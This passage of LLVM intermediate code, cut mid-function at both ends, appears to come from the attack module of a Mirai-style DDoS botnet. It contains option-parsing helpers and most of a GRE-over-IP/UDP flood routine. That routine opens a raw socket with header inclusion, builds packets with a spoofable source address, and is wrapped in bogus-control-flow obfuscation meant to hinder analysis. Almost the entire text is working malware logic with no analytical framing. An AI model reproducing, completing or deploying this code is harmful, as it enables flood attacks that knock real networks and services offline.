  %110 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %109, i32 0, i32 0
  %111 = load i8*, i8** %110, align 8
  call void @free(i8* %111) #6
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %77
  br label %originalBB10
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

declare i32 @sleep(i32) #3

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  br label %11

; <label>:11:                                     ; preds = %originalBBpart2, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %54

; <label>:16:                                     ; preds = %11
  %17 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %18 = load i32, i32* %10, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 1
  %22 = load i8, i8* %21, align 8
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* %8, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %23, %25
  br i1 %26, label %27, label %34

; <label>:27:                                     ; preds = %16
  %28 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i64 %30
  %32 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i32 0, i32 0
  %33 = load i8*, i8** %32, align 8
  store i8* %33, i8** %5, align 8
  br label %56

; <label>:34:                                     ; preds = %16
  br label %35

; <label>:35:                                     ; preds = %34
  %36 = load i32, i32* @x.13
  %37 = load i32, i32* @y.14
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %35
  %44 = load i32, i32* %10, align 4
  %45 = add nsw i32 %44, 1
  store i32 %45, i32* %10, align 4
  %46 = load i32, i32* @x.13
  %47 = load i32, i32* @y.14
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %11

; <label>:54:                                     ; preds = %11
  %55 = load i8*, i8** %9, align 8
  store i8* %55, i8** %5, align 8
  br label %56

; <label>:56:                                     ; preds = %54, %27
  %57 = load i8*, i8** %5, align 8
  ret i8* %57

originalBBalteredBB:                              ; preds = %originalBB, %35
  %58 = load i32, i32* %10, align 4
  %_ = sub i32 %58, 1
  %gen = mul i32 %_, 1
  %_1 = sub i32 %58, 1
  %gen2 = mul i32 %_1, 1
  %_3 = sub i32 0, %58
  %gen4 = add i32 %_3, 1
  %_5 = sub i32 %58, 1
  %gen6 = mul i32 %_5, 1
  %59 = add nsw i32 %58, 1
  store i32 %59, i32* %10, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %38

; <label>:19:                                     ; preds = %4
  %20 = load i32, i32* @x.15
  %21 = load i32, i32* @y.16
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %19
  %28 = load i8*, i8** %10, align 8
  %29 = call i32 @util_atoi(i8* %28, i32 10)
  store i32 %29, i32* %5, align 4
  %30 = load i32, i32* @x.15
  %31 = load i32, i32* @y.16
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %38

; <label>:38:                                     ; preds = %originalBBpart2, %17
  %39 = load i32, i32* %5, align 4
  ret i32 %39

originalBBalteredBB:                              ; preds = %originalBB, %19
  %40 = load i8*, i8** %10, align 8
  %41 = call i32 @util_atoi(i8* %40, i32 10)
  store i32 %41, i32* %5, align 4
  br label %originalBB
}

declare i32 @util_atoi(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = load i32, i32* @x.17
  %6 = load i32, i32* @y.18
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i32, align 4
  %14 = alloca i8, align 1
  %15 = alloca %struct.attack_option*, align 8
  %16 = alloca i8, align 1
  %17 = alloca i32, align 4
  %18 = alloca i8*, align 8
  store i8 %0, i8* %14, align 1
  store %struct.attack_option* %1, %struct.attack_option** %15, align 8
  store i8 %2, i8* %16, align 1
  store i32 %3, i32* %17, align 4
  %19 = load i8, i8* %14, align 1
  %20 = load %struct.attack_option*, %struct.attack_option** %15, align 8
  %21 = load i8, i8* %16, align 1
  %22 = call i8* @attack_get_opt_str(i8 zeroext %19, %struct.attack_option* %20, i8 zeroext %21, i8* null)
  store i8* %22, i8** %18, align 8
  %23 = load i8*, i8** %18, align 8
  %24 = icmp eq i8* %23, null
  %25 = load i32, i32* @x.17
  %26 = load i32, i32* @y.18
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %24, label %33, label %51

; <label>:33:                                     ; preds = %originalBBpart2
  %34 = load i32, i32* @x.17
  %35 = load i32, i32* @y.18
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %33
  %42 = load i32, i32* %17, align 4
  store i32 %42, i32* %13, align 4
  %43 = load i32, i32* @x.17
  %44 = load i32, i32* @y.18
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %54

; <label>:51:                                     ; preds = %originalBBpart2
  %52 = load i8*, i8** %18, align 8
  %53 = call i32 @inet_addr(i8* %52) #6
  store i32 %53, i32* %13, align 4
  br label %54

; <label>:54:                                     ; preds = %51, %originalBBpart24
  %55 = load i32, i32* @x.17
  %56 = load i32, i32* @y.18
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %54
  %63 = load i32, i32* %13, align 4
  %64 = load i32, i32* @x.17
  %65 = load i32, i32* @y.18
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret i32 %63

originalBBalteredBB:                              ; preds = %originalBB, %4
  %72 = alloca i32, align 4
  %73 = alloca i8, align 1
  %74 = alloca %struct.attack_option*, align 8
  %75 = alloca i8, align 1
  %76 = alloca i32, align 4
  %77 = alloca i8*, align 8
  store i8 %0, i8* %73, align 1
  store %struct.attack_option* %1, %struct.attack_option** %74, align 8
  store i8 %2, i8* %75, align 1
  store i32 %3, i32* %76, align 4
  %78 = load i8, i8* %73, align 1
  %79 = load %struct.attack_option*, %struct.attack_option** %74, align 8
  %80 = load i8, i8* %75, align 1
  %81 = call i8* @attack_get_opt_str(i8 zeroext %78, %struct.attack_option* %79, i8 zeroext %80, i8* null)
  store i8* %81, i8** %77, align 8
  %82 = load i8*, i8** %77, align 8
  %83 = icmp eq i8* %82, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %33
  %84 = load i32, i32* %17, align 4
  store i32 %84, i32* %13, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %54
  %85 = load i32, i32* %13, align 4
  br label %originalBB6
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greip(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = load i32, i32* @x.19
  %6 = load i32, i32* @y.20
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8, align 1
  %14 = alloca %struct.attack_target*, align 8
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_option*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8**, align 8
  %20 = alloca i8, align 1
  %21 = alloca i16, align 2
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i16, align 2
  %25 = alloca i16, align 2
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i8, align 1
  %29 = alloca i32, align 4
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.udphdr*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca %struct.iphdr*, align 8
  %36 = alloca %struct.grehdr*, align 8
  %37 = alloca %struct.iphdr*, align 8
  %38 = alloca %struct.udphdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %13, align 1
  store %struct.attack_target* %1, %struct.attack_target** %14, align 8
  store i8 %2, i8* %15, align 1
  store %struct.attack_option* %3, %struct.attack_option** %16, align 8
  %41 = load i8, i8* %13, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 %42, i64 8) #6
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %19, align 8
  %45 = load i8, i8* %15, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 2, i32 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %20, align 1
  %49 = load i8, i8* %15, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 3, i32 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %21, align 2
  %53 = load i8, i8* %15, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 4, i32 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %22, align 1
  %57 = load i8, i8* %15, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 5, i32 1)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %23, align 1
  %61 = load i8, i8* %15, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 6, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %24, align 2
  %65 = load i8, i8* %15, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 7, i32 65535)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %25, align 2
  %69 = load i8, i8* %15, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 0, i32 512)
  store i32 %71, i32* %26, align 4
  %72 = load i8, i8* %15, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 1, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %27, align 1
  %76 = load i8, i8* %15, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 19, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %28, align 1
  %80 = load i8, i8* %15, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %82 = load i32, i32* @LOCAL_ADDR, align 4
  %83 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 25, i32 %82)
  store i32 %83, i32* %29, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %84, i32* %18, align 4
  %85 = icmp eq i32 %84, -1
  %86 = load i32, i32* @x.19
  %87 = load i32, i32* @y.20
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %85, label %94, label %95

; <label>:94:                                     ; preds = %originalBBpart2
  br label %625

; <label>:95:                                     ; preds = %originalBBpart2
  store i32 1, i32* %17, align 4
  %96 = load i32, i32* %18, align 4
  %97 = bitcast i32* %17 to i8*
  %98 = call i32 @setsockopt(i32 %96, i32 0, i32 3, i8* %97, i32 4) #6
  %99 = icmp eq i32 %98, -1
  br i1 %99, label %100, label %103

; <label>:100:                                    ; preds = %95
  %101 = load i32, i32* %18, align 4
  %102 = call i32 @close(i32 %101)
  br label %625

; <label>:103:                                    ; preds = %95
  store i32 0, i32* %17, align 4
  br label %104

; <label>:104:                                    ; preds = %originalBBpart266, %103
  %105 = load i32, i32* %17, align 4
  %106 = load i8, i8* %13, align 1
  %107 = zext i8 %106 to i32
  %108 = icmp slt i32 %105, %107
  br i1 %108, label %109, label %321

; <label>:109:                                    ; preds = %104
  %110 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %111 = load i8**, i8*** %19, align 8
  %112 = load i32, i32* %17, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i8*, i8** %111, i64 %113
  store i8* %110, i8** %114, align 8
  %115 = load i8**, i8*** %19, align 8
  %116 = load i32, i32* %17, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  %119 = load i8*, i8** %118, align 8
  %120 = bitcast i8* %119 to %struct.iphdr*
  store %struct.iphdr* %120, %struct.iphdr** %30, align 8
  %121 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %122 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %121, i64 1
  %123 = bitcast %struct.iphdr* %122 to %struct.grehdr*
  store %struct.grehdr* %123, %struct.grehdr** %31, align 8
  %124 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %125 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %124, i64 1
  %126 = bitcast %struct.grehdr* %125 to %struct.iphdr*
  store %struct.iphdr* %126, %struct.iphdr** %32, align 8
  %127 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %128 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %127, i64 1
  %129 = bitcast %struct.iphdr* %128 to %struct.udphdr*
  store %struct.udphdr* %129, %struct.udphdr** %33, align 8
  %130 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %131 = bitcast %struct.iphdr* %130 to i8*
  %132 = load i8, i8* %131, align 4
  %133 = and i8 %132, 15
  %134 = or i8 %133, 64
  store i8 %134, i8* %131, align 4
  %135 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %136 = bitcast %struct.iphdr* %135 to i8*
  %137 = load i8, i8* %136, align 4
  %138 = and i8 %137, -16
  %139 = or i8 %138, 5
  store i8 %139, i8* %136, align 4
  %140 = load i8, i8* %20, align 1
  %141 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %142 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %141, i32 0, i32 1
  store i8 %140, i8* %142, align 1
  %143 = load i32, i32* %26, align 4
  %144 = sext i32 %143 to i64
  %145 = add i64 52, %144
  %146 = trunc i64 %145 to i16
  %147 = call zeroext i16 @htons(i16 zeroext %146) #7
  %148 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 2
  store i16 %147, i16* %149, align 2
  %150 = load i16, i16* %21, align 2
  %151 = call zeroext i16 @htons(i16 zeroext %150) #7
  %152 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 3
  store i16 %151, i16* %153, align 4
  %154 = load i8, i8* %22, align 1
  %155 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 5
  store i8 %154, i8* %156, align 4
  %157 = load i8, i8* %23, align 1
  %158 = icmp ne i8 %157, 0
  br i1 %158, label %159, label %163

; <label>:159:                                    ; preds = %109
  %160 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %161 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 4
  store i16 %160, i16* %162, align 2
  br label %163

; <label>:163:                                    ; preds = %159, %109
  %164 = load i32, i32* @x.19
  %165 = load i32, i32* @y.20
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %163
  %172 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 6
  store i8 47, i8* %173, align 1
  %174 = load i32, i32* %29, align 4
  %175 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 8
  store i32 %174, i32* %176, align 4
  %177 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %178 = load i32, i32* %17, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %177, i64 %179
  %181 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %180, i32 0, i32 1
  %182 = load i32, i32* %181, align 4
  %183 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %184 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %183, i32 0, i32 9
  store i32 %182, i32* %184, align 4
  %185 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %186 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %187 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %186, i32 0, i32 1
  store i16 %185, i16* %187, align 2
  %188 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %189 = bitcast %struct.iphdr* %188 to i8*
  %190 = load i8, i8* %189, align 4
  %191 = and i8 %190, 15
  %192 = or i8 %191, 64
  store i8 %192, i8* %189, align 4
  %193 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %194 = bitcast %struct.iphdr* %193 to i8*
  %195 = load i8, i8* %194, align 4
  %196 = and i8 %195, -16
  %197 = or i8 %196, 5
  store i8 %197, i8* %194, align 4
  %198 = load i8, i8* %20, align 1
  %199 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i32 0, i32 1
  store i8 %198, i8* %200, align 1
  %201 = load i32, i32* %26, align 4
  %202 = sext i32 %201 to i64
  %203 = add i64 28, %202
  %204 = trunc i64 %203 to i16
  %205 = call zeroext i16 @htons(i16 zeroext %204) #7
  %206 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 2
  store i16 %205, i16* %207, align 2
  %208 = load i16, i16* %21, align 2
  %209 = zext i16 %208 to i32
  %210 = xor i32 %209, -1
  %211 = trunc i32 %210 to i16
  %212 = call zeroext i16 @htons(i16 zeroext %211) #7
  %213 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %214 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %213, i32 0, i32 3
  store i16 %212, i16* %214, align 4
  %215 = load i8, i8* %22, align 1
  %216 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %217 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %216, i32 0, i32 5
  store i8 %215, i8* %217, align 4
  %218 = load i8, i8* %23, align 1
  %219 = icmp ne i8 %218, 0
  %220 = load i32, i32* @x.19
  %221 = load i32, i32* @y.20
  %222 = sub i32 %220, 1
  %223 = mul i32 %220, %222
  %224 = urem i32 %223, 2
  %225 = icmp eq i32 %224, 0
  %226 = icmp slt i32 %221, 10
  %227 = or i1 %225, %226
  br i1 %227, label %originalBBpart243, label %originalBB1alteredBB

originalBBpart243:                                ; preds = %originalBB1
  br i1 %219, label %228, label %232

; <label>:228:                                    ; preds = %originalBBpart243
  %229 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %230 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %231 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %230, i32 0, i32 4
  store i16 %229, i16* %231, align 2
  br label %232

; <label>:232:                                    ; preds = %228, %originalBBpart243
  %233 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %234 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %233, i32 0, i32 6
  store i8 17, i8* %234, align 1
  %235 = call i32 @rand_next()
  %236 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %237 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %236, i32 0, i32 8
  store i32 %235, i32* %237, align 4
  %238 = load i8, i8* %28, align 1
  %239 = icmp ne i8 %238, 0
  br i1 %239, label %240, label %262

; <label>:240:                                    ; preds = %232
  %241 = load i32, i32* @x.19
  %242 = load i32, i32* @y.20
  %243 = sub i32 %241, 1
  %244 = mul i32 %241, %243
  %245 = urem i32 %244, 2
  %246 = icmp eq i32 %245, 0
  %247 = icmp slt i32 %242, 10
  %248 = or i1 %246, %247
  br i1 %248, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %240
  %249 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %250 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %249, i32 0, i32 9
  %251 = load i32, i32* %250, align 4
  %252 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %253 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %252, i32 0, i32 9
  store i32 %251, i32* %253, align 4
  %254 = load i32, i32* @x.19
  %255 = load i32, i32* @y.20
  %256 = sub i32 %254, 1
  %257 = mul i32 %254, %256
  %258 = urem i32 %257, 2
  %259 = icmp eq i32 %258, 0
  %260 = icmp slt i32 %255, 10
  %261 = or i1 %259, %260
  br i1 %261, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br label %270

; <label>:262:                                    ; preds = %232
  %263 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %264 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %263, i32 0, i32 8
  %265 = load i32, i32* %264, align 4
  %266 = sub i32 %265, 1024
  %267 = xor i32 %266, -1
  %268 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %269 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %268, i32 0, i32 9
  store i32 %267, i32* %269, align 4
  br label %270

; <label>:270:                                    ; preds = %262, %originalBBpart247
  %271 = load i32, i32* @x.19
  %272 = load i32, i32* @y.20
  %273 = sub i32 %271, 1
  %274 = mul i32 %271, %273
  %275 = urem i32 %274, 2
  %276 = icmp eq i32 %275, 0
  %277 = icmp slt i32 %272, 10
  %278 = or i1 %276, %277
  br i1 %278, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %270
  %279 = load i16, i16* %24, align 2
  %280 = call zeroext i16 @htons(i16 zeroext %279) #7
  %281 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %282 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %281, i32 0, i32 0
  store i16 %280, i16* %282, align 2
  %283 = load i16, i16* %25, align 2
  %284 = call zeroext i16 @htons(i16 zeroext %283) #7
  %285 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %286 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %285, i32 0, i32 1
  store i16 %284, i16* %286, align 2
  %287 = load i32, i32* %26, align 4
  %288 = sext i32 %287 to i64
  %289 = add i64 8, %288
  %290 = trunc i64 %289 to i16
  %291 = call zeroext i16 @htons(i16 zeroext %290) #7
  %292 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %293 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %292, i32 0, i32 2
  store i16 %291, i16* %293, align 2
  %294 = load i32, i32* @x.19
  %295 = load i32, i32* @y.20
  %296 = sub i32 %294, 1
  %297 = mul i32 %294, %296
  %298 = urem i32 %297, 2
  %299 = icmp eq i32 %298, 0
  %300 = icmp slt i32 %295, 10
  %301 = or i1 %299, %300
  br i1 %301, label %originalBBpart255, label %originalBB49alteredBB

originalBBpart255:                                ; preds = %originalBB49
  br label %302

; <label>:302:                                    ; preds = %originalBBpart255
  %303 = load i32, i32* @x.19
  %304 = load i32, i32* @y.20
  %305 = sub i32 %303, 1
  %306 = mul i32 %303, %305
  %307 = urem i32 %306, 2
  %308 = icmp eq i32 %307, 0
  %309 = icmp slt i32 %304, 10
  %310 = or i1 %308, %309
  br i1 %310, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %302
  %311 = load i32, i32* %17, align 4
  %312 = add nsw i32 %311, 1
  store i32 %312, i32* %17, align 4
  %313 = load i32, i32* @x.19
  %314 = load i32, i32* @y.20
  %315 = sub i32 %313, 1
  %316 = mul i32 %313, %315
  %317 = urem i32 %316, 2
  %318 = icmp eq i32 %317, 0
  %319 = icmp slt i32 %314, 10
  %320 = or i1 %318, %319
  br i1 %320, label %originalBBpart266, label %originalBB57alteredBB

originalBBpart266:                                ; preds = %originalBB57
  br label %104

; <label>:321:                                    ; preds = %104
  br label %322

; <label>:322:                                    ; preds = %624, %321
  store i32 0, i32* %17, align 4
  br label %323

; <label>:323:                                    ; preds = %originalBBpart2126, %322
  %324 = load i32, i32* @x.19
